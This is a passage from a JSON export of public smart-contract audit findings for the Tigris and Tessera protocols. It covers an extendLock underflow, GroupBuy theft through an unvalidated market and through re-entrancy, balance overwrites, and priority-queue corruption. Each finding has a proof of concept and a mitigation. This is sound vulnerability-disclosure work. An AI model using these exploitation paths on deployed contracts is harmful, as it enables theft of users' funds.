lost", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/23", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105   # Vulnerability details  ## Impact The `Lock` contract ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10)) allows end-users to interact with bonds.    There are two functions that allow to lock some amount of assets. The first function is `Lock.lock` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76)) which creates a new bond. The second function is `Lock.extendLock` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92)). This function extends the lock for some `_period` and / or increases the locked amount by some `_amount`.    The issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105)) is called.    Therefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow.    So the amount of assets deposited using `Lock.extendLock` is lost.    ## Proof of Concept 1. User A calls `Lock.lock` to lock a certain `_amount` (amount1) of `_asset` for a certain `_period`. 2. User A calls then `Lock.extendLock` and increases the locked amount of the bond by some amount2 3. User A waits until the bond has expired 4. User A calls `Lock.release`. This function calculates `totalLocked[asset] -= lockAmount;`. Which will cause a revert because the value of `totalLocked[asset]` is only amount1  You can add the following test to the `Bonds` test in `Bonds.js`:   ```javascript describe(\"ReleaseUnderflow\", function () {     it(\"release can cause underflow\", async function () {         await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"110\"));         // Lock 100 for 9 days         await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 9);          await bond.connect(owner).setManager(lock.address);          await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther(\"10\"));          // Lock another 10         await lock.connect(user).extendLock(1, ethers.utils.parseEther(\"10\"), 0);          await network.provider.send(\"evm_increaseTime\", [864000]); // Skip 10 days         await network.provider.send(\"evm_mine\");          // Try to release 110 after bond has expired -> Underflow         await lock.connect(user).release(1);     }); }); ``` Run it with `npx hardhat test --grep \"release can cause underflow\"`.   You can see that it fails because it causes an underflow.    ## Tools Used VSCode  ## Recommended Mitigation Steps Add `totalLocked[_asset] += amount` to the `Lock.extendLock` function.  "}, {"title": "GroupBuy can be drained of all ETH.", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/52", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-09"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L204-L219   # Vulnerability details  ## Description   purchase() in GroupBuy faciilitates the purchasing of an NFT after enough contributions were gathered. Another report titled *\"Attacker can steal the amount collected so far in the GroupBuy for NFT purchase*\" describes a high impact bug in purchase. It is advised to read that first for context.  Additionally, purchase() is vulnerable to a re-entrancy exploit which can be *chained* or *not chained* to the \\_market issue to steal *the entire* ETH stored in GroupBuy, rather than being capped to `minReservePrices[_poolId] * filledQuantities[_poolId]`.   Attacker may take control of execution using this call: ``` // Executes purchase order transaction through market buyer contract and deploys new vault address vault = IMarketBuyer(_market).execute{value: _price}(_purchaseOrder); ``` It could occur either by exploiting the unvalidated \\_market vulnerability , or by abusing an existing market that uses a user address in \\_purchaseOrder.   There is no re-entrancy protection in purchase() call: ``` function purchase(     uint256 _poolId,     address _market,     address _nftContract,     uint256 _tokenId,     uint256 _price,     bytes memory _purchaseOrder,     bytes32[] memory _purchaseProof ) external { ```  \\_verifyUnsuccessfulState() needs to not revert for purchase call. It checks the pool.success flag: `if (pool.success || block.timestamp > pool.terminationPeriod) revert InvalidState();`  However, success is only set as the last thing in purchase(): ```     // Stores mapping value of poolId to newly deployed vault     poolToVault[_poolId] = vault;     // Sets pool state to successful     poolInfo[_poolId].success = true;     // Emits event for purchasing NFT at given price     emit Purchase(_poolId, vault, _nftContract, _tokenId, _price); } ```  Therefore, attacker can re-enter purchase() function multiple times, each time extracting the maximum allowed price. If attacker uses the controlled \\_market exploit, the function will return the current NFT owner, so when all the functions unwind they will keep setting success to true and exit nicely.  ## Impact  GroupBuy can be drained of all ETH.  ## Proof of Concept  1. GroupBuy holds 1500 ETH, from various bids 2. maximum allowed price (`minReservePrices[_poolId] * filledQuantities[_poolId]`) is 50 * 20 = 1000 ETH 3. purchase(1000 ETH) is called  1. GroupBuy sends attacker 1000 ETH and calls execute()   1. execute() calls purchase(500ETH)    1. GroupBuy sends attacker 500 ETH and calls execute()     1. execute returns NFT owner address    2. GroupBuy sees returned address is NFT owner. Marks success and returns   2. execute returns NFT owner address  2. GroupBuy sees returned address is NFT owner. Marks success and returns 4. Attacker is left with 1500 ETH. Previous exploit alone can only net 1000ETH. Additionally, this exploit can be chained to any trusted MarketBuyer which passes control to user for purchasing and storing in vault, and then returns a valid vault.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Add a re-entrancy guard to purchase() function. Also, change success variable before performing external contract calls."}, {"title": "GroupBuys that are completely filled still don't raise stated target amount", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/49", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L83   # Vulnerability details  ## Description  createPool() in GroupBuy.sol creates a new contribution pool around an NFT. It specifies a target \\_initialPrice as minimum amount of ETH the NFT will cost, and \\_totalSupply which is the number of Raes to be minted on purchase success.  minBidPrices is calculated from the two numbers. All future bids must be at least minBidPrices. It is assumed that if the totalSupply of Raes is filled up, the group will collect the initialPrice. ``` // Calculates minimum bid price based on initial price of NFT and desired total supply minBidPrices[currentId] = _initialPrice / _totalSupply; ```  The issue is that division rounding error will make minBidPrices too low. Therefore, when all Raes are minted using minBidPrices price: minBidPrices[currentId] * \\_totalSupply != \\_initialPrice   Therefore, not enough money has been collected to fund the purchase. It can be assumed that most people will use minBidPrices to drive the price they will choose. Therefore, even after discovering that the Group has not raised enough after filling the supply pool, it will be very hard to get everyone to top up the contribution by a bit. This is because the settled price which is collected from all contributions is minReservePrices, which is always the minimum price deposited.  Code in contribute that updates minReservePrices: ``` // Updates minimum reserve price if filled quantity amount is greater than 0 if (filledQuantity > 0) minReservePrices[_poolId] = getMinPrice(_poolId); ```   The check in purchase() that we don't charge more than minReservePrices from each contribution: ``` if (_price > minReservePrices[_poolId] * filledQuantities[_poolId])     revert InvalidPurchase(); ```  We can see an important contract functionality is not working as expected which will impair NFT purchases.  ## Impact  GroupBuys that are completely filled still don't raise stated target amount  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Round the minBidPrices up, rather than down. It will ensure enough funds are collected."}, {"title": "Attacker can steal the amount collected so far in the GroupBuy for NFT purchase.", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/47", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-08"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L204   # Vulnerability details  ## Description  purchase() in GroupBuy.sol executes the purchase call for the group. After safety checks, the NFT is bought with \\_market's execute() function. Supposedly it deploys a vault which owns the NFT. The code makes sure the vault is the new owner of the NFT and exits. ``` // Executes purchase order transaction through market buyer contract and deploys new vault address vault = IMarketBuyer(_market).execute{value: _price}(_purchaseOrder); // Checks if NFT contract supports ERC165 and interface ID of ERC721 tokens if (ERC165Checker.supportsInterface(_nftContract, _INTERFACE_ID_ERC721)) {     // Verifes vault is owner of ERC-721 token     if (IERC721(_nftContract).ownerOf(_tokenId) != vault) revert UnsuccessfulPurchase(); } else {     // Verifies vault is owner of CryptoPunk token     if (ICryptoPunk(_nftContract).punkIndexToAddress(_tokenId) != vault)         revert UnsuccessfulPurchase(); }  // Stores mapping value of poolId to newly deployed vault poolToVault[_poolId] = vault; // Sets pool state to successful poolInfo[_poolId].success = true; // Emits event for purchasing NFT at given price emit Purchase(_poolId, vault, _nftContract, _tokenId, _price); ```  The issue is that \\_market user-supplied variable is not validated at all. Attacker can pass their malicious contract, which uses the passed funds to buy the NFT and store it in attacker's wallet. It will return the NFT-holding wallet so the checks will pass. As a result, attacker has the NFT while they could have contributed nothing to the GroupBuy. Attacker can also just steal the supplied ETH and return the current address which holds the NFT.  ## Impact  Attacker can steal the amount collected so far in the GroupBuy for NFT purchase.  ## Proof of Concept  1. Group assembles and raises funds to buy NFT X 2. Attacker calls purchase() and supplies their malicious contract in \\_market, as described. 3. Attacker receives raised funds totalling  `minReservePrices[_poolId] * filledQuantities[_poolId]`, as checked in line 182.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  \\_market should be whitelisted, or supplied in createPool stage and able to be scrutinized."}, {"title": " Earlier bidders get cut out of future NFT holdings by bidders specifying the same price.", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/45", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2022-12-tessera-findings", "body": "# Lines of code  LOC: https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L301   # Vulnerability details  ## Description  In GroupBuy module, users can call contribute to get a piece of the NFT pie. There are two stages in transforming the msg.value to holdings in the NFT.\u00a0  1. filling at any price(supply is not yet saturated) ``` uint256 fillAtAnyPriceQuantity = remainingSupply < _quantity ? remainingSupply : _quantity; // Checks if quantity amount being filled is greater than 0 if (fillAtAnyPriceQuantity > 0) {     // Inserts bid into end of queue     bidPriorityQueues[_poolId].insert(msg.sender, _price, fillAtAnyPriceQuantity);     // Increments total amount of filled quantities     filledQuantities[_poolId] += fillAtAnyPriceQuantity; } ```  2. Trim out lower price offers to make room for current higher offer. ``` // Calculates unfilled quantity amount based on desired quantity and actual filled quantity amount uint256 unfilledQuantity = _quantity - fillAtAnyPriceQuantity; // Processes bids in queue to recalculate unfilled quantity amount unfilledQuantity = processBidsInQueue(_poolId, unfilledQuantity, _price); ```  The while loop in `processBidsInQueue` will keep removing existing bids with lower price and create new queue entries for currently processed bid. When it reached a bid with a higher price than msg.sender's price, it will break: ``` while (quantity > 0) {     // Retrieves lowest bid in queue     Bid storage lowestBid = bidPriorityQueues[_poolId].getMin();     // Breaks out of while loop if given price is less than than lowest bid price     if (_price < lowestBid.price) {         break;     } ```  The issue is that when `_price  == lowestBid.price`, we don't break and current bid will kick out older bid, as can be seen here:  ``` // Decrements given quantity amount from lowest bid quantity lowestBid.quantity -= quantity; // Calculates partial contribution of bid by quantity amount and price uint256 contribution = quantity * lowestBid.price; // Decrements partial contribution amount of lowest bid from total and user contributions totalContributions[_poolId] -= contribution; userContributions[_poolId][lowestBid.owner] -= contribution; // Increments pending balance of lowest bid owner pendingBalances[lowestBid.owner] += contribution; // Inserts new bid with given quantity amount into proper position of queue bidPriorityQueues[_poolId].insert(msg.sender, _price, quantity); ```  The described behavior goes against what the docs [describe](https://github.com/code-423n4/2022-12-tessera#step-3-other-users-deposit-funds-to-pool-filtering) will happen when two equal priced bids collide.  ## Impact  Earlier bidders get cut out of future NFT holdings by bidders specifying the same price.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Change the < to <= in the if condition: ``` if (_price <= lowestBid.price) {     break; } ```"}, {"title": "User loses collateral converted to pendingBalance when cash() or list() is called", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/44", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-07"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L295 https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L232   # Vulnerability details  ## Description  In OptimisticListingOpensea, there are several functions which update pendingBalances of a proposer: 1. list() 2. cash() 3. propose()  Unfortunately, in list() and cash() the = operator is used instead of += when writing the new pendingBalances. For example: ``` function cash(address _vault, bytes32[] calldata _burnProof) external {     // Reverts if vault is not registered     (address token, uint256 id) = _verifyVault(_vault);     // Reverts if active listing has not been settled     Listing storage activeListing = activeListings[_vault];     // Reverts if listing has not been sold     if (!_verifySale(_vault)) {         revert NotSold();     } else if (activeListing.collateral != 0) {         uint256 collateral = activeListing.collateral;         activeListing.collateral = 0;         // Sets collateral amount to pending balances for withdrawal         pendingBalances[_vault][activeListing.proposer] = collateral;     }  ... ```  pendingBalances is not guaranteed to be zero. There could be funds from previous proposals which are not yet collected. Propose updates pendingBalance correctly: ``` // Sets collateral amount to pending balances for withdrawal pendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral; ```  So, when propose is followed by another propose(), the pendingBalance is updated correctly, but in cash and list we don't account for pre-existing balance. This issue would manifest even after the fix suggested in the issue \"User can send a proposal and instantly take back their collateral\" because reject functions would increment the pendingBalance and then it would be overriden.  ## Impact  User loses collateral converted to pendingBalance when cash() or list() is called  ## Proof of Concept  1. User calls propose() and gets pendingBalance = x 2. User calls propose() with an improved proposal and gets pendingBalance = 1.5x 3. proposal is successfull and the listing purchased the NFT 4. cash() is called to convert the Raes to ETH amount from the sell. pendingBalance is overridden by the current \"collateral\"  value. pendingBalance = 0.5x 5. User loses x collateral value which is stuck in the contract  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Change the = operator to += in list() and cash()."}, {"title": "Funds are permanently stuck in OptimisticListingSeaport.sol contract if active proposal is executed after new proposal is pending.", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/43", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L428   # Vulnerability details  ## Description  \\_constructOrder is called in propose(), OptimisticListingSeaport.sol. It fills the order params stored in proposedListings[_vault].  ``` {     orderParams.offerer = _vault;     orderParams.startTime = block.timestamp;     // order doesn't expire in human time scales and needs explicit cancellations     orderParams.endTime = type(uint256).max;     orderParams.zone = zone;     // 0: no partial fills, anyone can execute     orderParams.orderType = OrderType.FULL_OPEN;     orderParams.conduitKey = conduitKey;     // 1 Consideration for the listing itself + 1 consideration for the fees     orderParams.totalOriginalConsiderationItems = 3; } ```  Importantly, it updates the order hash associated with the vault: `vaultOrderHash[_vault] = _getOrderHash(orderParams, counter);`  There is only one other use of `vaultOrderHash`, in \\_verifySale().  ``` function _verifySale(address _vault) internal view returns (bool status) {     (bool isValidated, bool isCancelled, uint256 totalFilled, uint256 totalSize) = ISeaport(         seaport     ).getOrderStatus(vaultOrderHash[_vault]);     if (isValidated && !isCancelled && totalFilled > 0 && totalFilled == totalSize) {         status = true;     } } ``` This function gets order information from the order hash, and makes sure the order is completely fulfilled.  After NFT sell has completed, cash() is used to distribute income ETH: ``` function cash(address _vault, bytes32[] calldata _burnProof) external {     // Reverts if vault is not registered     (address token, uint256 id) = _verifyVault(_vault);     // Reverts if active listing has not been settled     Listing storage activeListing = activeListings[_vault];     // Reverts if listing has not been sold    // -------------- _verifySale MUST BE TRUE ---------     if (!_verifySale(_vault)) {         revert NotSold();     } else if (activeListing.collateral != 0) {         uint256 collateral = activeListing.collateral;         activeListing.collateral = 0;         // Sets collateral amount to pending balances for withdrawal         pendingBalances[_vault][activeListing.proposer] = collateral;     } ```  As long as sale is not complete, cash() can't be called as highlighted. The issue is that `vaultOrderHash[_vault]` is not protected during the lifetime of an active proposal. If another proposal is proposed and then the sell using active proposal takes place, cash() will keep reverting. Funds are stuck in listing contract.  We can try to be clever and call propose() again with the same parameters to create an identical orderID, which will make `vaultOrderHash[_vault]` fine again and allow cash() to go through. But order params contain block.timestamp which will certainly be different which will make the hash different.   ## Impact  Funds are permanently stuck in OptimisticListingSeaport.sol contract if active proposal is executed after new proposal is pending.  ## Proof of Concept  1. User A calls propose(), setting proposedListing. vaultOrderHash=X 2. PROPOSAL_PERIOD passes , list is called promoting the listing to activeListing. 3. Another user, malicious or innocent, proposes another proposal. vaultOrderHash=Y 4. Sell goes down due to OpenSea validation confirmed on activeListing. 5. \\_verifySale will never return true because we can never got vaultOrderHash to be X 6. cash() is bricked. Money is stuck in contract.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Keep the order hash in the Listing structure rather than a single one per vault."}, {"title": "Loss of ETH for proposer when it is a contract that doesn't have fallback function.", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L209   # Vulnerability details  ## Description  sendEthOrWeth() is used in several locations in OptimisticListingSeaport: 1. rejectProposal - sent to proposer 2. rejectActive - sent to proposer 3. cash - sent to msg.sender  This is the implementation of sendEthOrWeth: ``` function _attemptETHTransfer(address _to, uint256 _value) internal returns (bool success) {     // Here increase the gas limit a reasonable amount above the default, and try     // to send ETH to the recipient.     // NOTE: This might allow the recipient to attempt a limited reentrancy attack.     (success, ) = _to.call{value: _value, gas: 30000}(\"\"); } /// @notice Sends eth or weth to an address /// @param _to Address to send to /// @param _value Amount to send function _sendEthOrWeth(address _to, uint256 _value) internal {     if (!_attemptETHTransfer(_to, _value)) {         WETH(WETH_ADDRESS).deposit{value: _value}();         WETH(WETH_ADDRESS).transfer(_to, _value);     } } ```  The issue is that the receive could be a contract that does not have a fallback function. In this scenario, \\_attemptETHTransfer will fail and WETH would be transferred to the contract. It is likely that it bricks those funds for the contract as there is no reason it would support interaction with WETH tokens.   It can be reasonably assumed that developers will develop contracts which will interact with OptimisticListingSeaport using proposals. They are not warned and are likely to suffer losses.  ## Impact  Loss of ETH for proposer when it is a contract that doesn't have fallback function.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Either enforce that proposer is an EOA or take in a recipient address for ETH transfers."}, {"title": "Priority queue min accounting breaks when nodes are split in two", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/32", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L299-L319   # Vulnerability details  The README states `If two users place bids at the same price but with different quantities, the queue will pull from the bid with a higher quantity first`, but the data-structure used for implementing this logic, is not used properly and essentially has its data corrupted when a large bid that is the current minimum bid, is split into two parts, so that a more favorable price can be used for a fraction of the large bid. The underlying issue is that one of the tree nodes is modified, without re-shuffling that node's location in the tree.  ## Impact The minimum bid as told by the priority queue will be wrong, leading to the wrong bids being allowed to withdraw their funds, and being kicked out of the fraction of bids that are used to buy the NFT.  ## Proof of Concept The priority queue using a binary tree within an array to [efficiently navigate and find the current minimum based on a node and it children](https://algs4.cs.princeton.edu/24pq/). The sorting of the nodes in the tree is based, in part, on the quantity in the case where two bids have the same price: ```solidity // File: src/lib/MinPriorityQueue.sol : MinPriorityQueue.isGreater()   #1  111        function isGreater( 112            Queue storage self, 113            uint256 i, 114            uint256 j 115        ) private view returns (bool) { 116            Bid memory bidI = self.bidIdToBidMap[self.bidIdList[i]]; 117            Bid memory bidJ = self.bidIdToBidMap[self.bidIdList[j]]; 118 @>         if (bidI.price == bidJ.price) { 119 @>             return bidI.quantity <= bidJ.quantity; 120            } 121            return bidI.price > bidJ.price; 122:       } ``` https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L111-L122  The algorithm of the binary tree only works when the nodes are properly sorted. The sorting is corrupted when a node is modified, without removing it from the tree and re-inserting it:  ```solidity // File: src/modules/GroupBuy.sol : GroupBuy.processBidsInQueue()   #2  299                Bid storage lowestBid = bidPriorityQueues[_poolId].getMin(); 300                // Breaks out of while loop if given price is less than than lowest bid price 301                if (_price < lowestBid.price) { 302                    break; 303                } 304     305                uint256 lowestBidQuantity = lowestBid.quantity; 306                // Checks if lowest bid quantity amount is greater than given quantity amount 307                if (lowestBidQuantity > quantity) { 308                    // Decrements given quantity amount from lowest bid quantity 309 @>                 lowestBid.quantity -= quantity; 310                    // Calculates partial contribution of bid by quantity amount and price 311                    uint256 contribution = quantity * lowestBid.price; 312     313                    // Decrements partial contribution amount of lowest bid from total and user contributions 314                    totalContributions[_poolId] -= contribution; 315                    userContributions[_poolId][lowestBid.owner] -= contribution; 316                    // Increments pending balance of lowest bid owner 317                    pendingBalances[lowestBid.owner] += contribution; 318     319:                   // Inserts new bid with given quantity amount into proper position of queue ``` https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L299-L319  Let's say that the tree looks like this:  ```             A:(p:100,q:10)             /             \\        B:(p:100,q:10)  C:(<whatever>)        /           \\ D:(whatever)   E:(whatever)   ```  If A is modified so that q (quantity) goes from 10 to 5, B should now be at the root of the tree, since it has the larger size, and would be considered the smaller node. When another node is added, say, `F:(p:100,q:6)`, the algorithm will see that F has a larger size than A, and so A will be popped out as the min, even though B should have been. All nodes that are under B (which may be a lot of the nodes if they all entered at the same price/quantity) essentially become invisible under various scenarios, which means the users that own those bids will not be able to withdraw their funds, even if they really are the lowest bid that deserves to be pushed out of the queue. Note that the swimming up that is done for `F` will not re-shuffle `B` since, according to the algorithm, `F` will start as a child of `C`, and `B` is not in the list of parent nodes of `C`.   ## Tools Used Code inspection  ## Recommended Mitigation Steps When modifying nodes of the tree, remove them first, then re-add them after modification "}, {"title": "Users that send funds at a price lower than the current low bid have the funds locked", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/31", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L114-L150 https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L301-L303   # Vulnerability details  If a user contributes funds after there is no more supply left, and they don't provide a price higher than the current minimum bid, they will be unable to withdraw their funds while the NFT remains unbought.  ## Impact Ether becomes stuck until and unless the NFT is bought, which may never happen  ## Proof of Concept When making a contribution, the user calls the `payable` `contribute()` function. If the supply has already been filled (`fillAtAnyPriceQuantity` is zero), the bid isn't inserted into the queue, so the new bid is not tracked anywhere. When the function reaches `processBidsInQueue()`...: ```solidity // File: src/modules/GroupBuy.sol : GroupBuy.contribute()   #1  99         function contribute( 100            uint256 _poolId, 101            uint256 _quantity, 102            uint256 _price 103 @>     ) public payable { 104            // Reverts if pool ID is not valid 105            _verifyPool(_poolId); 106            // Reverts if NFT has already been purchased OR termination period has passed 107            (, uint48 totalSupply, , , ) = _verifyUnsuccessfulState(_poolId); 108            // Reverts if ether contribution amount per Rae is less than minimum bid price per Rae 109            if (msg.value < _quantity * minBidPrices[_poolId] || _quantity == 0) 110                revert InvalidContribution(); 111            // Reverts if ether payment amount is not equal to total amount being contributed 112            if (msg.value != _quantity * _price) revert InvalidPayment(); 113     114            // Updates user and pool contribution amounts 115            userContributions[_poolId][msg.sender] += msg.value; 116            totalContributions[_poolId] += msg.value; 117     118            // Calculates remaining supply based on total possible supply and current filled quantity amount 119            uint256 remainingSupply = totalSupply - filledQuantities[_poolId]; 120            // Calculates quantity amount being filled at any price 121            uint256 fillAtAnyPriceQuantity = remainingSupply < _quantity ? remainingSupply : _quantity; 122     123            // Checks if quantity amount being filled is greater than 0 124 @>         if (fillAtAnyPriceQuantity > 0) { 125                // Inserts bid into end of queue 126                bidPriorityQueues[_poolId].insert(msg.sender, _price, fillAtAnyPriceQuantity); 127                // Increments total amount of filled quantities 128                filledQuantities[_poolId] += fillAtAnyPriceQuantity; 129            } 130     131            // Calculates unfilled quantity amount based on desired quantity and actual filled quantity amount 132            uint256 unfilledQuantity = _quantity - fillAtAnyPriceQuantity; 133            // Processes bids in queue to recalculate unfilled quantity amount 134 @>         unfilledQuantity = processBidsInQueue(_poolId, unfilledQuantity, _price); 135     136            // Recalculates filled quantity amount based on updated unfilled quantity amount 137            uint256 filledQuantity = _quantity - unfilledQuantity; 138            // Updates minimum reserve price if filled quantity amount is greater than 0 139            if (filledQuantity > 0) minReservePrices[_poolId] = getMinPrice(_poolId); 140     141            // Emits event for contributing ether to pool based on desired quantity amount and price per Rae 142            emit Contribute( 143                _poolId, 144                msg.sender, 145                msg.value, 146                _quantity, 147                _price, 148                minReservePrices[_poolId] 149            ); 150:       } ``` https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L99-L150  ...if the price isn't higher than the lowest bid, the while loop is broken out of, with `pendingBalances` having never been updated, and the function does not revert: ```solidity // File: src/modules/GroupBuy.sol : GroupBuy.processBidsInQueue()   #2  291        function processBidsInQueue( 292            uint256 _poolId, 293            uint256 _quantity, 294            uint256 _price 295        ) private returns (uint256 quantity) { 296            quantity = _quantity; 297            while (quantity > 0) { 298                // Retrieves lowest bid in queue 299                Bid storage lowestBid = bidPriorityQueues[_poolId].getMin(); 300                // Breaks out of while loop if given price is less than than lowest bid price 301 @>             if (_price < lowestBid.price) { 302 @>                 break; 303 @>             } 304     305                uint256 lowestBidQuantity = lowestBid.quantity; 306                // Checks if lowest bid quantity amount is greater than given quantity amount 307                if (lowestBidQuantity > quantity) { 308                    // Decrements given quantity amount from lowest bid quantity 309                    lowestBid.quantity -= quantity; 310                    // Calculates partial contribution of bid by quantity amount and price 311                    uint256 contribution = quantity * lowestBid.price; 312     313:                   // Decrements partial contribution amount of lowest bid from total and user contributions ``` https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L291-L313  In order for a user to get funds back, the amount must have been stored in `pendingBalances`, and since this is never done, all funds contributed during the `contribute()` call become property of the `GroupBuy` contract, with the user being unable to withdraw...: ```solidity // File: src/modules/GroupBuy.sol : GroupBuy.withdrawBalance()   #3  274        function withdrawBalance() public { 275            // Reverts if caller balance is insufficient 276 @>         uint256 balance = pendingBalances[msg.sender]; 277 @>         if (balance == 0) revert InsufficientBalance(); 278     279            // Resets pending balance amount 280            delete pendingBalances[msg.sender]; 281     282            // Transfers pending ether balance to caller 283            payable(msg.sender).call{value: balance}(\"\"); 284:       } ``` https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L274-L284  ...until the order has gone through, and they can `claim()` excess funds, but there likely won't be any, due to the separate MEV bug I raised: ```solidity // File: src/modules/GroupBuy.sol : GroupBuy.contribution   #4  228        function claim(uint256 _poolId, bytes32[] calldata _mintProof) external { 229            // Reverts if pool ID is not valid 230            _verifyPool(_poolId); 231            // Reverts if purchase has not been made AND termination period has not passed 232            (, , , bool success, ) = _verifySuccessfulState(_poolId); 233            // Reverts if contribution balance of user is insufficient 234 @>         uint256 contribution = userContributions[_poolId][msg.sender]; 235            if (contribution == 0) revert InsufficientBalance(); 236     237            // Deletes user contribution from storage 238            delete userContributions[_poolId][msg.sender]; ``` https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L228-L244   ## Tools Used Code inspection  ## Recommended Mitigation Steps `revert()` if the price is lower than the min bid, and the queue is already full "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/29", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", 